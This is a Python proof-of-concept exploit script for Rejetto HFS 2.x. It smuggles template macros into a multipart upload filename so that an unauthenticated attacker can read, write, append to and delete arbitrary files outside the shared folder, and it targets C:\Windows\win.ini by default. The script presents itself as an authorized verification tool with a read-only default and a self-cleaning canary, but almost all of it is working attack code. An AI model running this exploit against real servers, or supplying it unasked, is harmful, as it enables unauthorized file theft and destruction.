#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PoC / verification script — Rejetto HFS 2.x: privileged template file macros
(`{.load.}` / `{.save.}` / `{.append.}` / `{.delete.}` / `{.filesize.}` /
`{.exists.}`) perform no caller authorization check and accept absolute paths,
so any template-evaluation primitive yields arbitrary file read / write / delete
OUTSIDE the shared folder, unauthenticated.

The file macros resolve their path through `uri2diskMaybe()`, which returns the
argument VERBATIM when it contains no forward slash — an absolute Windows path
therefore bypasses the virtual-file-system containment entirely — and the macro
branches consult no capability. See `scriptLib.pas` (`load`, `save`, `delete`
branches) and `utillib.pas` `uri2diskMaybe`.

READ-ONLY by default. A write/delete round-trip is available behind
`--write-demo`, which creates a uniquely named canary in the system temp
directory, verifies it, and removes it again. Nothing inside the shared folder is
touched. No shell callbacks, no persistence, no lateral movement.

Usage
-----
    # read a file outside the share (read-only, default)
    python3 verify_hfs2_macro_fileops.py --target http://192.168.1.235:8090 \
        --read 'C:\\Windows\\win.ini'

    # prove write+delete with a self-cleaning canary in %TEMP%
    python3 verify_hfs2_macro_fileops.py --target http://192.168.1.235:8090 --write-demo

    USE_BURP=0 ...   # connect directly instead of through Burp

Proxy: traffic is routed to Burp by default (USE_BURP=1, BURP_PROXY=127.0.0.1:8080)
so every packet can be inspected/replayed.

Author : @wgetnz
License: for authorized security testing and vulnerability verification only.
"""
import argparse
import os
import socket
import sys
import time
from urllib.parse import urlsplit

BOUNDARY = "X"
# `:}` terminates the engine's {: ... :} quoting region; `%item-resource%` is
# echoed from the raw multipart filename without escaping.
INJECT_PREFIX = "%item-resource%:}"
BS = "{.chr|92.}"          # backslash — a literal '\' is stripped from the filename
DS = "{.chr|58.}"          # colon     — a literal ':' can be mangled by clients


def parse_target(url):
    p = urlsplit(url if "://" in url else "http://" + url)
    host = p.hostname or ""
    port = p.port or (443 if p.scheme == "https" else 80)
    path = p.path or "/"
    if not path.endswith("/"):
        path += "/"
    return host, port, path


def send_macro(host, port, path, payload, timeout=30, verbose=True):
    """Deliver a complete `{.macro ...}` payload through the upload-filename injection."""
    filename = INJECT_PREFIX + payload
    body = (b"--" + BOUNDARY.encode() + b"\r\n"
            + b'Content-Disposition: form-data; name="f"; filename="'
            + filename.encode("latin-1") + b'"\r\n'
            + b"Content-Type: application/octet-stream\r\n\r\n"
            + b"hi\r\n--" + BOUNDARY.encode() + b"--\r\n")

    use_burp = os.environ.get("USE_BURP", "1") == "1"
    if use_burp:
        bp = urlsplit(os.environ.get("BURP_PROXY", "http://127.0.0.1:8080"))
        peer = (bp.hostname or "127.0.0.1", bp.port or 8080)
        uri = "http://%s:%d%s" % (host, port, path)
    else:
        peer = (host, port)
        uri = path

    req = ("POST " + uri + " HTTP/1.1\r\n"
           "Host: " + host + ":" + str(port) + "\r\n"
           "Content-Type: multipart/form-data; boundary=" + BOUNDARY + "\r\n"
           "Content-Length: " + str(len(body)) + "\r\n"
           "Connection: close\r\n"
           "User-Agent: hfs2-macro-fileops-poc/1.0\r\n\r\n").encode("latin-1") + body

    s = socket.create_connection(peer, timeout=timeout)
    try:
        s.sendall(req)
        chunks = []
        while True:
            try:
                b = s.recv(65536)
            except socket.timeout:
                break
            if not b:
                break
            chunks.append(b)
        resp = b"".join(chunks)
    finally:
        s.close()

    _, _, rb = resp.partition(b"\r\n\r\n")
    text = rb.decode("latin-1", "replace")
    if verbose:
        print("[>] macro: %s" % payload)
        print("[<] %s" % text[:300].replace("\r\n", "\\r\\n"))
    return text


def win_path(p):
    """Express a Windows path using macros so no literal \\ or : travels in the filename."""
    out = []
    for ch in p:
        if ch == "\\":
            out.append(BS)
        elif ch == ":":
            out.append(DS)
        else:
            out.append(ch)
    return "".join(out)


def main():
    ap = argparse.ArgumentParser(description="HFS 2.x privileged template file macros — missing authorization PoC")
    ap.add_argument("--target", default=os.environ.get("TARGET", "http://TARGET:8090"))
    ap.add_argument("--read", default="C:\\Windows\\win.ini",
                    help="absolute path OUTSIDE the shared folder to read (read-only)")
    ap.add_argument("--write-demo", action="store_true",
                    help="also perform a self-cleaning write/append/delete round-trip in %%TEMP%%")
    args = ap.parse_args()

    host, port, path = parse_target(args.target)
    print("=" * 74)
    print(" HFS 2.x template file macros: missing authorization + path escape")
    print(" target: %s:%d%s" % (host, port, path))
    print(" proxy : %s" % ("Burp " + os.environ.get("BURP_PROXY", "http://127.0.0.1:8080")
                           if os.environ.get("USE_BURP", "1") == "1" else "direct"))
    print("=" * 74)

    # --- 1) existence oracle on a file outside the share
    print("\n[1] Existence oracle outside the share  ({.exists|%s.})" % args.read)
    r = send_macro(host, port, path, "{.exists|" + win_path(args.read) + ".}")
    if "1" not in r:
        print("[-] file not reported as existing — check the path")
        return 1
    print("[+] server confirms %s exists (outside the shared folder)" % args.read)

    # --- 2) size oracle
    print("\n[2] Size oracle  ({.filesize|%s.})" % args.read)
    send_macro(host, port, path, "{.filesize|" + win_path(args.read) + ".}")

    # --- 3) arbitrary file read (the core, read-only proof)
    print("\n[3] Arbitrary file READ outside the share  ({.load|%s.})" % args.read)
    body = send_macro(host, port, path,
                      "{.load|" + win_path(args.read) + "|var=z.}{.^z.}")
    if len(body.strip()) < 20:
        print("[-] no content returned")
        return 1
    print("[+] file content returned unauthenticated (%d bytes in response)" % len(body))

    if args.write_demo:
        # --- 4) write + append + delete round-trip, canary in %TEMP%, self-cleaning
        mark = "ZZHFS2_%d" % int(time.time())
        canary = os.environ.get("TEMP", "C:\\Windows\\Temp") + "\\" + mark + ".txt"
        print("\n[!] WRITE OPERATIONS ENABLED — canary: %s" % canary)
        print("\n[4] CREATE  ({.save|%s|<content>.})" % canary)
        send_macro(host, port, path,
                   "{.save|" + win_path(canary) + "|OUTSIDE_SHARE_" + mark + ".}")
        print("\n[5] READ BACK")
        send_macro(host, port, path, "{.load|" + win_path(canary) + "|var=z.}{.^z.}")
        print("\n[6] APPEND  ({.append|...|APPENDED.})")
        send_macro(host, port, path, "{.append|" + win_path(canary) + "|_APPENDED.}")
        print("\n[7] DELETE  ({.delete|%s.})  — canary removed" % canary)
        send_macro(host, port, path, "{.delete|" + win_path(canary) + ".}")
        print("\n[8] VERIFY GONE  ({.exists|%s.})" % canary)
        send_macro(host, port, path, "{.exists|" + win_path(canary) + ".}")

    print("\n" + "=" * 74)
    print("[+] VULNERABLE: unauthenticated arbitrary file access via template macros")
    print("=" * 74)
    return 0


if __name__ == "__main__":
    sys.exit(main())
